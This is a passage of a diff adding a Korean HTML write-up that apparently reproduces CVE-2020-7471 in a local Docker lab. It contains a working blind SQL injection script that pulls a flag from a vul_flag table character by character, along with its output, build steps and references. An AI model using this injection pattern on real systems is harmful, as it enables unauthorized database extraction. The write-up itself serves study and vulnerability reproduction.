+        <span class="k">for</span> <span class="nb">ascii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s">"""-</span><span class="se">\\</span><span class="s">&gt;</span><span class="si">%27</span><span class="s">)</span><span class="si">%20</span><span class="s">AS</span><span class="si">%20</span><span class="s">"mydefinedname"</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">"vul_blog"</span><span class="si">%20</span><span class="s">WHERE</span><span class="si">%201</span><span class="s">=1</span><span class="si">%20</span><span class="s">AND</span><span class="si">%20</span><span class="s">case</span><span class="si">%20</span><span class="s">
+            when</span><span class="si">%20</span><span class="s">(select</span><span class="si">%20</span><span class="s">ascii(substring((SELECT</span><span class="si">%20</span><span class="s">(flag)</span><span class="si">%20</span><span class="s">as</span><span class="si">%20</span><span class="s">cnt</span><span class="si">%20</span><span class="s">FROM</span><span class="si">%20</span><span class="s">vul_flag</span><span class="si">%20</span><span class="s">offset</span><span class="si">%200%20</span><span class="s">
+            limit</span><span class="si">%201</span><span class="s">),</span><span class="si">%20</span><span class="s">{j},1)))</span><span class="si">%20</span><span class="s">&lt;=</span><span class="si">%20</span><span class="s">{ascii}</span><span class="si">%20</span><span class="s">then</span><span class="si">%20</span><span class="s">true</span><span class="si">%20</span><span class="s">else</span><span class="si">%20</span><span class="s">false</span><span class="si">%20</span><span class="s">end</span><span class="si">%20%20</span><span class="s">GROUP</span><span class="si">%20</span><span class="s">BY</span><span class="si">%20</span><span class="s">"
+            vul_blog"."title"</span><span class="si">%20</span><span class="s">LIMIT</span><span class="si">%201%20</span><span class="s">offset</span><span class="si">%201%20</span><span class="s">--"""</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s">"{server}{id}{content_param}{payload}"</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">exists_check</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ascii</span><span class="p">))</span>
+                <span class="k">break</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">#Information Schema에서 테이블 정보 추출
+#get_table_info_from_information_schema()
+</span>
+<span class="c1">#테이블명 알아냈으니 information_schema에서 column 정보 추출
+#get_column_info_from_information_schema()
+</span>
+<span class="c1">#column정보 기반으로 flag 값 추출
+</span><span class="n">get_flag_from_flag_table</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>다음은 실행 결과입니다.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D033Y_!S_L0N3LY
+</code></pre></div></div>
+
+<h2 id="서비스-구동-방법">서비스 구동 방법</h2>
+<hr />
+<ol>
+  <li>Build Docker image
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make build
+</code></pre></div>    </div>
+  </li>
+  <li>Up Docker Image
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make up
+</code></pre></div>    </div>
+  </li>
+  <li>Check Web Site
+    <ul>
+      <li><a href="http://127.0.0.1/post/1/">127.0.0.1</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="레퍼런스">레퍼런스</h3>
+<ul>
+  <li><a href="https://github.com/Saferman/CVE-2020-7471">Poc</a></li>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7471">CVE-2020-7471</a></li>
+  <li><a href="https://docs.djangoproject.com/ko/2.1/topics/security/">Django Security</a></li>
+  <li><a href="https://www.djangoproject.com/weblog/2020/feb/03/security-releases/">Django Offical Document</a></li>
+  <li><a href="https://docs.djangoproject.com/en/3.0/releases/security/#february-3-2020-cve-2020-7471">Django Release History</a></li>
+</ul>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
